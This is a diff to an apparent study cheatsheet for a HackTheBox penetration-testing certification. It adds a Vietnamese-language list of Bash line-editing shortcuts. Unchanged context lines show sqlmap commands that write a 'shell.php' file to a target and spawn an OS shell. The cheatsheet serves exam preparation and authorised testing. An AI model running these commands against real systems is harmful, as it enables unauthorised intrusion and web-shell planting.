@@ -50,7 +50,8 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
 - [Login Brute Forcing](#login-brute-forcing)
     - [Hydra](#hydra)
 - [SQLMap](#sqlmap)
-- 
+
+- [Bash Line Editing Shortcut](#Bash Line Editing Shortcut)
 - [bloodhound](#bloodhound)
 - [netexec](#netexec)
 - [certipy](#certipy)
@@ -760,6 +761,19 @@ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/
 
 # Spawn a shell
 sqlmap -u "http://www.example.com/?id=1" --os-shell
+
+```
+## Bash Line Editing Shortcuts 
+
+```
+Alt + D             : Xóa từ vị trí con trỏ đến hết từ hiện tại
+Alt + F             : Nhảy con trỏ lên phía trước một từ.
+Alt + B             : Nhảy con trỏ lùi lại phía sau một từ.
+Alt + Backspace	    : Xóa một từ ngược về phía trước (tương tự Ctrl + W nhưng phân biệt ký tự đặc biệt tốt hơn).
+Ctrl + W	        : Xóa từ ngay phía trước con trỏ (hữu ích nếu bạn đang ở cuối mật khẩu).
+Ctrl + K	        : Xóa toàn bộ phần còn lại của dòng tính từ vị trí con trỏ về bên phải.
+Ctrl + U	        : Xóa sạch toàn bộ dòng lệnh (nếu bạn muốn viết lại từ đầu).
+
 
 ```
 ## bloodhound 
